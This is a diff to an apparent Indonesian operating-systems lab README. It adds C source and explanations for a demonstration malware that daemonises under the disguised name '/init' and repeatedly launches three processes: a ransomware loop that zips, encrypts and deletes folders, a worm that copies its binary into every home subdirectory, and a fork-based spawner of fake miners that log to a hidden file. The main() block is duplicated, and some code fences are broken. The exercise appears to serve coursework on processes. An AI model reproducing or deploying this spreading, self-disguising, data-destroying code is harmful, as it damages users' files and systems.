@@ -692,6 +692,8 @@ void wannacryptor() {
 - `FILE *log = fopen("/tmp/wannalog.txt", "a+");` Membuka file log di path `/tmp/wannalog.txt;` Mode "a+" berarti: buka untuk baca/tulis
 - `while (1) {
         zip_and_encrypt();` Mengarsip (zip) semua folder di direktori saat ini, mengenkripsi semua file zip dan file lain, lalu menghapus folder asli setelah zip.
+![Screenshot 2025-04-18 110512](https://github.com/user-attachments/assets/5da8a2a8-e587-4585-ac4c-3296b003e9f2)
+
 
 c. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.
 ```sh
@@ -751,11 +753,318 @@ void trojan_wrm() {
     }
 }
 ```
+- `const char *target_base = "/home/riverz";` Folder root tempat malware akan menyebar dan mencari seluruh subdirektori dalam /home/riverz.
+- `struct dirent *entry;
+char dest_path[1024];`
+- entry digunakan untuk membaca isi direktori (readdir).
+- dest_path akan menyimpan path lengkap tempat runme akan disalin.
+- `while ((entry = readdir(dir)) != NULL) {`Iterasi untuk setiap file/folder dalam /home/riverz.
+- `snprintf(folder_path, sizeof(folder_path), "%s/%s", target_base, entry->d_name);` Gabungkan nama direktori penuh cth: /home/riverz/random
+- `snprintf(dest_path, sizeof(dest_path), "%s/%s", folder_path, runme_name);` Path akhir tujuan cth: /home/riverz/random/runme.
+- `while ((ch = fgetc(src)) != EOF)
+        fputc(ch, dst);` Salin isi file byte demi byte dari sumber ke tujuan.
+- `while (1) {
+    sleep(5);
+}` Loop selamanya dengan delay 5 detik untuk mempertahankan proses tetap berjalan agar tidak langsung keluar.
+
+d. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.
+```sh
+int main(int argc, char *argv[]) {
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+
+    if (argc >= 2 && strcmp(argv[1], " ") == 0) {
+      prctl(PR_SET_NAME, (unsigned long) argv[0], 0, 0, 0);
+      cryptominer(argv[0][strlen(argv[0]) - 1] - '0');           
+    }
+
+    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
+            rodok_launcher();
+        return 0;
+    }
+
+    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
+            wannacryptor();
+        return 0;
+    }
+    
+    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
+            trojan_wrm();
+        return 0;
+    }
+    
+    if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+
+        while (1) {
+            pid_t pid = fork();
+            if (pid == 0) {
+                char *args[] = {"wannacryptor", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv wannacryptor failed");
+                exit(1);
+            }
+        
+            pid_t pid2 = fork();
+            if (pid2 == 0) {
+                char *args[] = {"trojan.wrm", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv trojan.wrm failed");
+                exit(1);
+            }
+
+            pid_t pid3 = fork();
+            if (pid3 == 0) {
+                char *args[] = {"rodok.exe", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv rodok.exe failed");
+                exit(1);
+            }
+            
+            int status;
+            waitpid(-1, &status, WNOHANG);
+
+            sleep(30);
+        }
+    }
+
+    char *newargv[] = { "init", NULL};
+    execv("/proc/self/exe", newargv);
+    perror("execv init failed");
+    exit(1);
+}
+```
+- `sleep(30);` menjalankan childprocess pertama `wannacryptor` dan kedua `trojan.wrm` setiap 30 detik.
+![Screenshot 2025-04-18 110626](https://github.com/user-attachments/assets/4506436f-f0cb-4769-bd71-2c75988df2ac)
 
 
+e. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.
+f. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)
+g. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: 
+[YYYY-MM-DD hh:mm:ss][Miner XX] hash
+Dimana XX adalah ID mine-crafter yang membuat hash tersebut.
+h. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.
+```sh
+void sigterm_handler(int signum) {
+    keep_running = 0;
+}
+
+void sigterm_handler_rodok(int signum) {
+    for (int i = 0; i < 6; i++) {
+        if (child[i] > 0) {
+            kill(child[i], SIGTERM);
+        }
+    }
+    exit(0);
+}
+
+void cryptominer(int id) {
+    signal(SIGTERM, sigterm_handler);
+    char logpath[] = "/tmp/.miner.log";
+    FILE *log = fopen(logpath, "a+");
+    if (!log) exit(1);
+
+    srand(time(NULL) + id);
+
+    while (keep_running) {
+        char hash[65];
+        for (int i = 0; i < 64; i++) {
+            int r = rand() % 16;
+            hash[i] = "0123456789abcdef"[r];
+        }
+        hash[64] = '\0';
+
+        time_t now = time(NULL);
+        struct tm *t = localtime(&now);
+
+        fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
+                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+                t->tm_hour, t->tm_min, t->tm_sec,
+                id, hash);
+        fflush(log);
+
+        sleep((rand() % 28) + 3);
+    }
+
+    fclose(log);
+}
+
+void rodok_launcher() {
+    srand(time(NULL));
+    setpgid(0, 0);
+
+    signal(SIGTERM, sigterm_handler_rodok);
+
+    for (int miner_id = 0; miner_id < 6; miner_id++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            char name[32];
+            snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);
+
+            setpgid(0, 0);
+
+            char *args[] = {name, " ", NULL};
+            execv("/proc/self/exe", args);
+            perror("execv miner gagal");
+            exit(1);
+        } else if (pid > 0) {
+            child[miner_id] = pid;
+        }
+    }
+
+    int status;
+    while (wait(&status) > 0);
+}
+```
+- `signal(SIGTERM, sigterm_handler);`
+Pasang handler untuk `SIGTERM` dan `rodok_launcher` agar bisa shutdown saat disuruh.
+- `char logpath[] = "/tmp/.miner.log";
+FILE *log = fopen(logpath, "a+");
+if (!log) exit(1);` Buka file log tersembunyi (/tmp/.miner.log) untuk mencatat aktivitas miner.
+- ```sh
+  ``` while (keep_running) {
+    char hash[65];
+    for (int i = 0; i < 64; i++) {
+        int r = rand() % 16;
+        hash[i] = "0123456789abcdef"[r];
+    }
+    hash[64] = '\0';
+Membuat string hash acak 64 karakter berupa hex.
+- ```sh
+  time_t now = time(NULL);
+    struct tm *t = localtime(&now);
+
+    fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
+            t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
+            t->tm_hour, t->tm_min, t->tm_sec,
+            id, hash);
+    fflush(log);
+  ```
+  Tulis hash + timestamp + ID ke file log, format: [2025-04-17 22:01:54][Miner 01] 8b2f9c...
+- `sleep((rand() % 28) + 3);` Tidur acak antara 3–30 detik.
+- `for (int miner_id = 0; miner_id < 6; miner_id++) {
+    pid_t pid = fork();
+    if (pid == 0) {` Loop buat 6 proses anak.
+- `snprintf(name, sizeof(name), "mine-crafter-%02d", miner_id);` Buat nama proses palsu seperti mine-crafter-00, mine-crafter-01....
+- `int status;
+while (wait(&status) > 0);` Tunggu semua child mati (blocking).
+![Screenshot 2025-04-18 110256](https://github.com/user-attachments/assets/760fc55c-83fc-4d0d-8a3d-d931944bb9a2)
+![Screenshot 2025-04-18 110626](https://github.com/user-attachments/assets/b44a9738-8e77-479d-9d63-488e98dd333c)
+
+```sh
+int main(int argc, char *argv[]) {
+    char cwd[1024];
+    getcwd(cwd, sizeof(cwd));
+
+    if (argc >= 2 && strcmp(argv[1], " ") == 0) {
+      prctl(PR_SET_NAME, (unsigned long) argv[0], 0, 0, 0);
+      cryptominer(argv[0][strlen(argv[0]) - 1] - '0');           
+    }
+
+    if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
+            rodok_launcher();
+        return 0;
+    }
+
+    if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
+            wannacryptor();
+        return 0;
+    }
+    
+    if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
+        prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
+            trojan_wrm();
+        return 0;
+    }
+    
+    if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+
+        while (1) {
+            pid_t pid = fork();
+            if (pid == 0) {
+                char *args[] = {"wannacryptor", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv wannacryptor failed");
+                exit(1);
+            }
+        
+            pid_t pid2 = fork();
+            if (pid2 == 0) {
+                char *args[] = {"trojan.wrm", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv trojan.wrm failed");
+                exit(1);
+            }
+
+            pid_t pid3 = fork();
+            if (pid3 == 0) {
+                char *args[] = {"rodok.exe", NULL};
+                execv("/proc/self/exe", args);
+                perror("execv rodok.exe failed");
+                exit(1);
+            }
+            
+            int status;
+            waitpid(-1, &status, WNOHANG);
+
+            sleep(30);
+        }
+    }
+
+    char *newargv[] = { "init", NULL};
+    execv("/proc/self/exe", newargv);
+    perror("execv init failed");
+    exit(1);
+}
+```
+- `if (argc > 0 && strcmp(argv[0], "rodok.exe") == 0) {
+    prctl(PR_SET_NAME, (unsigned long)"rodok.exe", 0, 0, 0);
+    rodok_launcher();
+    return 0;
+}` Jika program dijalankan dengan argumen "rodok.exe", maka menjalankan `rodok_launcher()`.
+- `if (argc > 0 && strcmp(argv[0], "wannacryptor") == 0) {
+    prctl(PR_SET_NAME, (unsigned long)"wannacryptor", 0, 0, 0);
+    wannacryptor();
+    return 0;
+}` Menjalankan loop ransomware `(zip_and_encrypt)` setiap 30 detik.
+- `if (argc > 0 && strcmp(argv[0], "trojan.wrm") == 0) {
+    prctl(PR_SET_NAME, (unsigned long)"trojan.wrm", 0, 0, 0);
+    trojan_wrm();
+    return 0;
+}`Menyalin executable ini ke folder-folder di `/home/riverz/NAMA_FOLDER/runme`.
+- `if (argc > 0 && strcmp(argv[0], "init") == 0) {
+    daemonize();  // jadi background process
+    chdir(cwd);   // balik ke working directory semula
+    prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);`
+- ```if (argc > 0 && strcmp(argv[0], "init") == 0) {
+        daemonize();
+        chdir(cwd);
+        prctl(PR_SET_NAME, (unsigned long) "/init", 0, 0, 0);
+  ```
+- Jika argumen pertama yang dijalankan adalah `init` maka menjalankan:
+  - `daemonize()` Program menjadi proses daemon dan menyamarkan nama proses `/init`, lalu membuat 3 fork yang dijalankan terpisah:
+  - `wannacryptor` ransomware (zip + xor + hapus folder).
+  - `trojan.wrm`
+  - `rodok.exe` Spawner miner palsu.
+- `int status;
+waitpid(-1, &status, WNOHANG);
+sleep(30);` Tidur 30 detik sebelum repeat.
+- `char *newargv[] = { "init", NULL };
+execv("/proc/self/exe", newargv);
+perror("execv init failed");
+exit(1);` Jalankan ulang dirinya sendiri sebagai `init`
 
 
-	
 ## Soal_4
 
 
